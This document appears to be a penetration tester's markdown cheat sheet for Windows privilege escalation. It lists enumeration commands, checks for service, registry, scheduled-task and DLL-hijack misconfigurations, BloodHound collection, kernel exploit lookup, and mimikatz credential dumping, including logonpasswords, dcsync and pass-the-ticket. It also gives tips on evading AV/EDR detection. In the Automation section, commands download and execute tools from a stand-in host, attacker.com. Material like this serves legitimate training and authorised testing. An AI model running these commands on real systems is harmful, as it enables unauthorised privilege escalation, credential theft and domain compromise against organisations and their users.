# Windows Privilege Escalation

## Things to remember
  *  Beyond searching for a privesc vector, these checks help establish awareness
  *  Always check R/W perms on interesting files
      *  When inherited permissions are changed/disabled, discrepancies can occur
  *  Look for other ways to interact with local services/service binaries... get creative!

## Useful tools
  *  [`winPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS) and [`windows-privesc-check`](https://github.com/pentestmonkey/windows-privesc-check) for automated enum
  *  [`PowerUp.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) and [`PowerView.ps1`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) for various enum
  *  [`accesschk.exe`](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) of [sysinternals](https://learn.microsoft.com/en-us/sysinternals/) for checking perms over various objects
  *  [`PsLoggedOn.exe`](https://learn.microsoft.com/en-us/sysinternals/downloads/psloggedon) for enumerating logon sessions
  *  [`Invoke-Spy.ps1`](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Privilege%20Escalation/Windows/Powershell%20Scripts/Invoke-Spy.ps1) for process spying on Windows
  *  [`Get-ModifiableServiceRegKeys.ps1`](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Privilege%20Escalation/Windows/Powershell%20Scripts/Get-ModifiableServiceRegKeys.ps1) for enumerating service reg key permissions
  *  [`Find-ReadablePrivileges.ps1`](https://github.com/SpacemanHenry/hacknotes/blob/main/Post%20Exploitation/Privilege%20Escalation/Windows/Powershell%20Scripts/Find-ReadablePrivileges.ps1) for enumerating privileges held by process tokens
  *  [`procmon`](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon) for monitoring various process events
  *  [`bloodhound`](https://github.com/BloodHoundAD/BloodHound) and [`SharpHound`](https://github.com/BloodHoundAD/SharpHound)/[`bloodhound-python`](https://github.com/dirkjanm/bloodhound.py) for collecting/[graphing](https://github.com/CompassSecurity/BloodHoundQueries) AD abuse paths
  *  [`wesng`](https://github.com/bitsadmin/wesng) for suggesting Windows exploits
  *  [`SharpDPAPI`](https://github.com/GhostPack/SharpDPAPI) for finding credentials stored via [DPAPI](https://learn.microsoft.com/en-us/windows/win32/seccng/cng-dpapi)
  *  [`mimikatz`](https://blog.gentilkiwi.com/mimikatz) for quickly dumping credentials from Windows
  

## [Elevators](https://github.com/SpacemanHenry/hacknotes/tree/main/Post%20Exploitation/Privilege%20Escalation/Windows/Elevators)
  *  Hand-rolled methods for escalating to `SYSTEM`
      *  At least local administrator is usually required
  *  Code in this section simply spawns a `cmd.exe` instance
      *  Consider replacing payload before deployment
      *  Choose payloads wisely, these can easily trigger an AV/EDR response

## Automation
  *  Cover a lot of ground and make a lot of noise
      *  Consider low and slow manual enumeration to avoid prying eyes

```
PS > IWR -uri http://attacker.com/winPEASany.exe -outfile winPEASany.exe; .\winPEASany.exe | tee winpeas.txt
PS > IWR -uri http://attacker.com/windows-privesc-check2.exe -outfile windows-privesc-check2.exe; .\windows-privesc-check2.exe -h
```

## Whoami
  *  Identify the newly owned user
      *  Includes group memberships and specific privileges  
      *  Watch for [privileges of interest](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens): `SeImpersonatePrivilege`, `SeBackupPrivilege/SeRestorePrivilege`, etc.
  *  Custom PS function `Find-ReadablePrivileges` gathers privileges held by process tokens

```
whoami
net user bob
net user bob /domain
whoami /all  
```

```
PS > Find-ReadablePrivileges
PS > Find-ReadablePrivileges -ExcludeNames lsass
```

## Users, groups, hosts, and sessions
  *  Identify target users, groups, and hosts
      *  Watch for groups of interest `Backup Operators`, `Domain Administrators`, etc.
      *  Search readable/writable files in `C:\Users` home directories
  *  [`net`](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems) command and `PowerView.ps1` cmdlets for enumerating users/groups
      *  `net` is old and doesn't handle nested groups well
      *  Pipe to the [`select`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-object?view=powershell-7.4) cmdlet to avoid massive amounts of output
  *  Find domain hosts and logon sessions with `PsLoggedon.exe` and `PowerView.ps1` cmdlets

// Local users and groups
```
dir C:\Users
net user
net user bob
net localgroup
```

// Domain users and groups
```
net user /domain
net user bob /domain
net group /domain
net group "Domain Admins" /domain
PS > Get-NetUser | select samaccountname,lastlogon,logoncount,serviceprincipalname
PS > Get-NetGroup | select samaccountname
PS > Get-NetGroup "Domain Admins" | select-object -ExpandProperty member
```

// Domain hosts and logon sessions
```
net view
PS > Get-NetComputer | select dnshostname,samaccountname,operatingsystem,operatingsystemversion
PsLoggedon.exe -accepteula \\exampleComputerName
PS > Get-NetLoggedon -ComputerName exampleComputerName -Verbose
PS > Get-NetSession -ComputerName exampleComputerName -Verbose
```

## System information
  *  General information about the local system
      *  `searchsploit`/`Google` all the things
      *  Establish awareness before hunting for specific vectors
      *  Watch for interesting processes, services, software

// Hostname (duh)
```
hostname
```

// [Windows](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/ver) [OS](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo) [version](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_editions?view=powershell-7.4)
```
ver
systeminfo
PS > $PSVersionTable.BuildVersion
PS > $PSVersionTable.OS
```

// [Environment variables](https://devblogs.microsoft.com/scripting/powertip-use-windows-powershell-to-display-all-environment-variables/)
```
set
PS > gci env:
```

// [Powershell/CLR/management protocol versions](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_editions?view=powershell-7.4)
```
PS > $PSVersionTable
```

// Installed and running software/applications
```
PS > Get-Process | Select-Object -Property ProcessName, Id, SI, Path
wmic product get name, version, vendor
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

// [Disks](https://learn.microsoft.com/en-us/powershell/module/storage/get-disk?view=windowsserver2022-ps) and [partitions](https://learn.microsoft.com/en-us/powershell/module/storage/get-partition?view=windowsserver2022-ps)
```
mountvol
PS > Get-Disk
PS > Get-Partition -DiskNumber 0
```

// Device drivers
```
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}
```

## Network information
  *  Enumerate information about the network configuration of the system
      *  Lots of info here develops awareness of systems position within the network
  *  Search for opportunities to abuse network services running on the system
      *  Check for network services running with higher privileges
      *  **Check R/W perms over files/dirs of network services**

// [Network](https://learn.microsoft.com/en-us/powershell/module/netadapter/get-netadapter?view=windowsserver2022-ps) [interfaces](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netipinterface?view=windowsserver2022-ps)
```
ipconfig /all
PS > Get-NetAdapter
PS > Get-NetIPInterface
```

// [Network](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netstat) [connections](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-nettcpconnection?view=windowsserver2022-ps) (includes listening services)
```
netstat -ano
PS > Get-NetTCPConnection
```

// Domains/forests (mostly `PowerView.ps1` cmdlets)
```
PS > [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
PS > Get-NetForest
PS > Get-NetDomain
PS > Get-NetForestDomain
```

// [Routing](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/route_ws2008) [table](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netroute?view=windowsserver2022-ps) and [ARP](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/arp) [cache](https://learn.microsoft.com/en-us/powershell/module/nettcpip/get-netneighbor?view=windowsserver2022-ps)
```
route print
netstat -r
arp -A
PS > Get-NetRoute
PS > Get-NetNeighbor
```

// [Firewall](https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallprofile?view=windowsserver2022-ps) [configuration](https://learn.microsoft.com/en-us/powershell/module/netsecurity/get-netfirewallrule?view=windowsserver2022-ps)
```
netsh advfirewall show currentprofile
netsh advfirewall firewall show rule name=all
netsh firewall show state
netsh firewall show config
netsh advfirewall show allprofiles
netsh advfirewall show global
netsh advfirewall show store
PS > Get-NetFirewallProfile
PS > Get-NetFirewallRule -All
```

## AlwaysInstallElevated
  *  Check if [`AlwaysInstallElevated`](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated) is enabled, easy win  
      *  When checking manually, both reg keys must be `0x1`
  *  `PowerUp.ps1` cmdlet if you're lazy

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```
PS > Get-RegistryAlwaysInstallElevated
```

## Insecure credentials
  *  Have any passwords? **TRY THEM ALL, EVERYWHERE**
      *  Also try weak creds such as blank password, username as password, etc.
      *  Remember guesswork methodology: find words of interest!
  *  Check for [saved creds](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#credentials-manager-windows-vault) with [`cmdkey`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmdkey)
  *  Search for insecure `SYSTEM`/`SAM` hive backups with [`where`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/where) or [`Get-ChildItem`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.4)
      *  `where` is an alias within `powershell`, specify full path
      *  `accesschk.exe` for viewing perms over `SYSTEM`/`SAM` reg hives
      *  Domain controllers store creds in [`NTDS.dit`](https://www.thehacker.recipes/a-d/movement/credentials/dumping/ntds)
  *  Search for credential stores for all services
      *  Credentials could be stored in databases, configs, reg keys, etc.
      *  Dump credentials from any service you have privileges over

```
cmdkey /list
```

```
C:\Windows\System32\where /r C:\ "*SYSTEM"
C:\Windows\System32\where /r C:\ "*SYSTEM*ba*k*"
C:\Windows\System32\where /r C:\ "*SAM"
C:\Windows\System32\where /r C:\ "*SAM*ba*k*"
PS > gci -path c:\ -recurse -filter "*SYSTEM" -file -erroraction silentlycontinue
PS > gci -path c:\ -recurse -filter "*SYSTEM*ba*k*" -file -erroraction silentlycontinue
```

```
accesschk.exe /accepteula -uvwqk HKLM
accesschk.exe /accepteula -uvwqk bob HKLM
```

```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## [Startup Apps](https://support.microsoft.com/en-us/windows/add-an-app-to-run-automatically-at-startup-in-windows-10-150da165-dcd9-7230-517b-cf3c295d89dd) and [AutoRuns](https://learn.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys)
  *  Programs within the startup apps folders execute on login
      *  For a specific user or all users depending on location
      *  Swap out startup app binaries for code exec as another user
  *  AutoRun reg keys will also execute programs on login
      *  For a specific user or all users depending on reg hive/key location
      *  Overwrite reg keys for code exec as another user
  *  `accesschk.exe` for viewing perms over startup programs, AutoRun executables, and AutoRun reg keys
  *  `PowerUp.ps1` cmdlet for finding writable AutoRun reg keys

```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -uvwqk HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
accesschk.exe /accepteula -quvw "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\exampleStartup.exe"
```

```
PS > Get-ModifiableRegistryAutoRun
```

## Scheduled Tasks
  *  [`schtasks`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) and [`Get-ScheduledTask`](https://learn.microsoft.com/en-us/powershell/module/scheduledtasks/get-scheduledtask?view=windowsserver2022-ps) cmdlet for listing readable tasks  
      *  There may be scheduled tasks you dont have perms to see
      *  Grab author field to check for quick hits
  *  `PowerUp.ps1` cmdlet to check write perms over scheduled task files
  *  Custom `Invoke-Spy.ps1` cmdlet to expose tasks via [WMI event subscription](https://learn.microsoft.com/en-us/powershell/module/cimcmdlets/register-cimindicationevent?view=powershell-5.1)
      *  May not show filepaths, search by hand if something interesting happens
      *  May be able to infer process owner from session IDs

```
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /fi Author
PS > Get-ScheduledTask
```

```
PS > Get-ModifiableScheduledTaskFile
PS > Invoke-Spy
```

## Services
  *  Find potentially misconfigured services  
  *  [`sc`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11)) for listing all services and basic service configuration  
      *  `sc` is an alias within `powershell`, specify full path
      *  `accesschk.exe` for viewing perms over services and service files/reg keys
  *  WMI also provides service information
      *  Remove results from `C:\Windows` to list non-standard services
  *  Various `PowerUp.ps1` cmdlets for hunting specific misconfigurations
      *  Custom function in `Get-ModifiableServiceRegKeys.ps1` covers insecure service registry key permissions

```
tasklist /SVC
C:\Windows\System32\sc query state=all
C:\Windows\System32\sc qc exampleService
C:\Windows\System32\sc query exampleService
accesschk.exe /accepteula -ucqv bob exampleService
accesschk.exe /accepteula -quvw "C:\Program Files\Example Service\exampleService.exe"
accesschk.exe /accepteula -uvwqk HKLM\SYSTEM\CurrentControlSet\Services\exampleService
```

// List service information via WMI
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows"
PS > Get-WmiObject win32_service | Select-Object Name, State, PathName | Where-Object {$_.State -like 'Running'}
```

// List service details/misconfigs with `PowerUp.ps1` and `Get-ModifiableServiceRegKeys.ps1`
```
PS > Get-ServiceDetail exampleService
PS > Get-UnquotedService
PS > Get-ModifiableService
PS > Get-ModifiableServiceFile
PS > Get-ModifiableServiceRegKeys
```

## Finding files of interest
  *  `accesschk.exe` for recursively searching files based on permissions
      *  `-w` and `-r` for writable/readable respectively
  *  `powershell` for recursively checking group perms against files
      *  Re-run query with all groups you're a member of
      *  Also with all effective write permissions?
      *  Too many results when recursively listing? `-Depth`
  *  `Get-PSReadLineOption` PSH cmdlet helps find powershell history files

```
accesschk.exe -urs "C:\Users\bob"
accesschk.exe -uws "C:\Users\bob"
PS > Get-ChildItem "C:\Users\bob" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
PS > Get-ChildItem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue
PS > Get-ChildItem -Path C:\Users\ -File -Recurse -Depth 3 -ErrorAction SilentlyContinue
PS > Get-PSReadLineOption
```

## [DLL Hijacking](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking)
  *  Force an application to load a malicious DLL
      *  Generate DLLs with `msfvenom` or [roll your own](https://github.com/SpacemanHenry/hacknotes/tree/main/Post%20Exploitation/Evasion/Process%20Injection/DLL%20Injection/Custom%20DLL): be wary of architecture
  *  `Google` and `searchsploit` all installed applications
  *  Monitoring image loads with `procmon` can also expose DLL hijack opportunities
  *  `PowerUp.ps1` cmdlet for finding writable directories to store DLLs

```
PS > Find-PathDLLHijack
```

## Domain object permissions
  *  Hunt for [ACL/ACE](https://learn.microsoft.com/en-us/windows/win32/ad/how-access-control-works-in-active-directory-domain-services) misconfigs granting control over domain objects
  *  `bloodhound` useful for finding AD abuse paths
      *  Deploy `SharpHound` or the like and import data
      *  `bloodhound-python` for remote collection
      *  View nodes of owned principals and resolve all access rights
  *  `PowerView.ps1` cmdlet useful for quickly seeing some of these
      *  Find "interesting" ACEs and filter based on objects of interest

```
sudo neo4j start
bloodhound
```

```
bloodhound-python -d 'example.com' -u 'bob' -p 'password123' -c all
bloodhound-python -d 'example.com' -u 'bob' -p 'password123' -c dconly -ns 10.0.0.1
.\SharpHound.exe -c all
.\SharpHound.exe -c DCOnly
```

```
PS > Find-InterestingDomainAcl | select-object -expandproperty SecurityIdentifier -unique | Convert-SidToName
PS > Find-InterestingDomainAcl | where-object -property SecurityIdentifier -eq $("exampleDomain\bob" | Convert-NameToSid)
PS > Find-InterestingDomainAcl -ResolveGUIDs | where-object -property SecurityIdentifier -eq $("exampleDomain\bob" | Convert-NameToSid)
```

## Kernel exploits
  *  [Enumerate patch level](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#version-info-enumeration) and search accordingly
  *  `Google`, `searchsploit`, and `wesng` for finding Windows kernel exploits

```
git clone https://github.com/bitsadmin/wesng
./wes.py systeminfo.txt --update
./wes.py systeminfo.txt
./wes.py systeminfo.txt --exploits-only
```

```
wmic qfe get Caption, Description, HotFixID, InstalledOn
```

## Credential dumping
  *  Various cred [dumping techniques](https://book.hacktricks.xyz/windows-hardening/stealing-credentials/credentials-mimikatz) with `mimikatz`
      *  Capable of exporting/importing kerberos tickets to disk/memory
      *  Be careful not to purge any kerberos tickets you want to keep!
  *  Check your current kerberos tickets with `klist`
  *  Hunt/dump creds stored via DPAPI with `SharpDPAPI` and [decrypt](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html) with `mimikatz` 

```
.\SharpDPAPI.exe search /type:folder /path:C:\Users\bob
```

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::dcsync /user:bob
```

```
klist
mimikatz # sekurlsa::tickets
mimikatz # sekurlsa::tickets /export
mimikatz # kerberos::purge
mimikatz # kerberos::ptt [0;1a796e]-2-0-60a10000-bob@krbtgt-exampleDomain.local.kirbi
```
